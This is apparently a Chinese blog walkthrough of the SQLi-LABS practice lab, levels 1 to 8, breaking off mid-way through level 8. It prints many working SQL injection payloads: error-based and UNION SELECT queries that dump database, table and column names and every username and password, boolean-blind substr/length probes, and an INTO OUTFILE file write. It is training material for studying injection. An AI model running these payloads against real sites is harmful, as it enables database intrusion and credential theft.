<!DOCTYPE html><html lang="cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="index, follow"><title>SQLi-LABS • Webb</title><meta name="description" content="SQLi-LABS - Webb"><link rel="icon" href="/57182600.jpeg"><link rel="stylesheet" href="https://unpkg.com/nanoreset@3.0.1/nanoreset.min.css"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Webb"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Webb" type="application/atom+xml">
</head><body><div class="wrap" id="barba-wrapper"><header><h1 class="branding"><a href="/" title="Webb"><img class="logo-image" src="/57182600.jpeg" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link no-barba" href="/" target="_self">主页</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/about" target="_self">关于</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/works" target="_self">作品</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/archives" target="_self">档案</a></li><li class="nav-list-item"></ul></header><div class="barba-container"><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">SQLi-LABS</h1><div class="post-info"><a></a>2021-10-26</div><div class="post-content"><h2 id="Less-1-基于错误的字符串"><a href="#Less-1-基于错误的字符串" class="headerlink" title="Less-1  基于错误的字符串"></a>Less-1  基于错误的字符串</h2><ul>
<li>首先找到注入点，打开首页提示我们要输入一个ID带数值的参数。</li>
<li>这里我输入id&#x3D;1就返回下列内容。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210922211256357.png" alt="image-20210922211256357"></p>
<ul>
<li>因为这网页的标题是基于错误的字符串注入，这里我们尝试在<code>?id=1&#39;</code>后面添加一个单引号。</li>
<li>然后就返回了错误消息。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210922211216216.png" alt="image-20210922211216216"></p>
<ul>
<li>从这里的信息我们可以推断出SQL语句。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这是我们假设的<span class="keyword">SQL</span>语句。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>现在我们就可以构建Payload。</li>
<li>使用下列语句，尝试是否可以注入。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>结果发现是可以注入SQL语句。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210922211632148.png" alt="image-20210922211632148"></p>
<ul>
<li>接下来我们需要拆字段数量。这里我们使用<code>order by </code>语句查询。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">--+ 是注释掉后面的 limit 0,1 语句</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 8 --+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>我们使用二分法来使用8发现报错了。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210922212043154.png" alt="image-20210922212043154"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 错误</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 8 --+ </span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+ </span></span><br><span class="line"># 正确</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 2 --+ </span></span><br><span class="line"><span class="string"># 正确</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+ </span></span><br></pre></td></tr></table></figure>

<ul>
<li>最终发现该查询有三个字段名，假设SQL语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>union select</code>语句尝试这三个字段名，是否在页面显示。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>发现只显示了2和3，1并没有显示出来。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210922212755277.png" alt="image-20210922212755277"></p>
<ul>
<li>接下来尝试在2和3这里进行注入。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 在<span class="number">2</span>的位置获取当前数据库名。</span><br><span class="line"># 在<span class="number">3</span>的位置获取当前数据库用户名。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1, database(), user() --+</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210922213025200.png" alt="image-20210922213025200"></p>
<ul>
<li>这里使用的数据库名为”<strong>security</strong>“，新增我们尝试获取该数据中所有表名。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果不使用group_concat()函数会导致错误。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),user() --+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里查出来了<code>authors,emails,referers,uagents,users</code>五个表。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210922214305778.png" alt="image-20210922214305778"></p>
<ul>
<li>使用下列语句查询出某个表中的列名数量，这里我们尝试获取<code>users</code>表的列数。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>users<span class="string">&#x27;),user() --+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查询结果了<code>id,username,password</code>三个列。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210922214651869.png" alt="image-20210922214651869"></p>
<ul>
<li>最后查询出表中的所有数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果你不是在靶场环境我不建议你直接查询某个表中的所有数据，建议加上limit语句。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210922215200093.png" alt="image-20210922215200093"></p>
<ul>
<li>你可以使用上面的语句去获取其他表中的数据。</li>
</ul>
<h2 id="Less-2-基于错误的整数"><a href="#Less-2-基于错误的整数" class="headerlink" title="Less-2 基于错误的整数"></a>Less-2 基于错误的整数</h2><ul>
<li>在Less-1中我们已经找到了注入Less-2也是一样。</li>
<li>首先我们假设该查询语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> $id limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>Less-1我们已经把列名和列数量获取到了。</li>
<li>可以使用只有下列payload进行注入：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),(<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> users) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210923192840979.png" alt="image-20210923192840979"></p>
<h2 id="Less-3-基于错误的字符串（扭曲）"><a href="#Less-3-基于错误的字符串（扭曲）" class="headerlink" title="Less-3  基于错误的字符串（扭曲）"></a>Less-3  基于错误的字符串（扭曲）</h2><ul>
<li>在id后面添加单引号发现出现错误。这里的错误有点区别。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"><span class="operator">/</span>Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210923193545135.png" alt="image-20210923193545135"></p>
<ul>
<li>发现多了<code>)</code>括号。我们可以假设该语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;$id&#x27;</span>) limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>由于Less-1，我们已经猜出列名和列数量。我们可以执行使用查询<code>users</code>表的数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210923194821023.png" alt="image-20210923194821023"></p>
<h2 id="Less-4-基于错误的双引号字符串"><a href="#Less-4-基于错误的双引号字符串" class="headerlink" title="Less-4 基于错误的双引号字符串"></a>Less-4 基于错误的双引号字符串</h2><ul>
<li>这里提示我们要使用**”**双引号。使用双引号以后就出现了错误。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210923195939937.png" alt="image-20210923195939937"></p>
<ul>
<li>根据错误信息我们可以推断出该SQL语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> <span class="keyword">where</span> id <span class="operator">=</span> (&quot;$id&quot;) limit <span class="number">0</span>, <span class="number">1</span>;  </span><br></pre></td></tr></table></figure>

<ul>
<li>进过尝试以后我们发现，可以进行注入。现在我们要把数据都用户名和密码都查出来：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span>&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/SQLi-LABS/image-20210923203205746.png" alt="image-20210923203205746"></p>
<h2 id="Less-5-双查询单引号字符串"><a href="#Less-5-双查询单引号字符串" class="headerlink" title="Less-5  双查询单引号字符串"></a>Less-5  双查询单引号字符串</h2><ul>
<li>首先使用单引号测试出现错误。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 错误内容</span><br><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span><span class="number">15</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>根据错误信息可以推断出：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">1</span>, <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以使用Less-1的SQL来进行获取数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span></span><br><span class="line"># 没有返回数据。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span></span><br><span class="line"><span class="string"># 页面返回</span></span><br><span class="line"><span class="string">You are in...........</span></span><br></pre></td></tr></table></figure>

<ul>
<li>首先查询数据的长度：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 成功</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&gt;=8,1,0) --+</span></span><br><span class="line"><span class="string"># 成功</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&gt;=</span><span class="number">16</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 成功</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&gt;=32,1,0) --+</span></span><br><span class="line"><span class="string"># 成功</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&gt;=</span><span class="number">64</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&lt;=128,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&lt;=</span><span class="number">96</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&lt;=80,1,0) --+</span></span><br><span class="line"><span class="string"># 正确</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&lt;=</span><span class="number">88</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&lt;=92,1,0) --+</span></span><br><span class="line"><span class="string"># 正确</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&lt;=</span><span class="number">90</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&lt;=91,1,0) --+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用下列语句查询数据：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>d<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>b<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>u<span class="string">&#x27;,1,0) --+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-6-双查询双引号字符串"><a href="#Less-6-双查询双引号字符串" class="headerlink" title="Less-6 双查询双引号字符串"></a>Less-6 双查询双引号字符串</h2><ul>
<li>首先要找出注入点：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正确</span><br><span class="line"><span class="number">1</span>&quot; and 1=1--+</span><br><span class="line"># 错误</span><br><span class="line">1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>由于Less-6了Less-5注入方式是差不多所以我们就不重复Less-5的步骤直接执行最后的步骤：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;a&#x27;,1,0) --+</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;d&#x27;,1,0) --+</span><br><span class="line"></span><br><span class="line"># 查询第二位数据</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;b&#x27;,1,0) --+</span><br><span class="line"># 错误</span><br><span class="line">/?id=1&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;u&#x27;,1,0) --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-7-转储到outfile"><a href="#Less-7-转储到outfile" class="headerlink" title="Less-7 转储到outfile"></a>Less-7 转储到outfile</h2><ul>
<li>这里题目提醒我们要使用outfile</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210924201419355.png" alt="image-20210924201419355"></p>
<ul>
<li>首先我们尝试使用单引号看看会不会报错。经过测试会出现错误。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210924202801469.png" alt="image-20210924202801469"></p>
<ul>
<li>这次的错误信息没有给我很好提示，我们只能靠猜（由于我们前面已经知道该查询列数有三个）：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 错误</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> &quot;$id&quot; limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;$id&#x27;</span>) limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> (&quot;$id&quot;) limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 正确</span><br><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> ((<span class="string">&#x27;$id&#x27;</span>)) limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以靠上面猜测的SQL语句使用<code>outfile</code>。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;)) union select id,username,password from users into outfile &#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span>mysql.txt<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-8-Boolean单引号字符串"><a href="#Less-8-Boolean单引号字符串" class="headerlink" title="Less-8 Boolean单引号字符串"></a>Less-8 Boolean单引号字符串</h2><ul>
<li>传入id&#x3D;1，会返回下列数据。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210924213039528.png" alt="image-20210924213039528"></p>
<ul>
<li>现在我们尝试在id&#x3D;1后面加单引号，页面就没有返回数据（我们可以大胆猜测没返回数据应该是错误或找不到数据）。</li>
</ul>
<p><img src="/../../images/SQLi-LABS/image-20210924214034556.png" alt="image-20210924214034556"></p>
<ul>
<li>我们可以大胆猜测数据该SQL语句为：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">1</span>,<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<strong>and</strong>尝试是否可以注入。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 有返回信息</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1 --+</span></span><br><span class="line"><span class="string"># 没返回信息</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里我们使用**if()<strong>函数和</strong>substr()**函数进行猜数据。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span 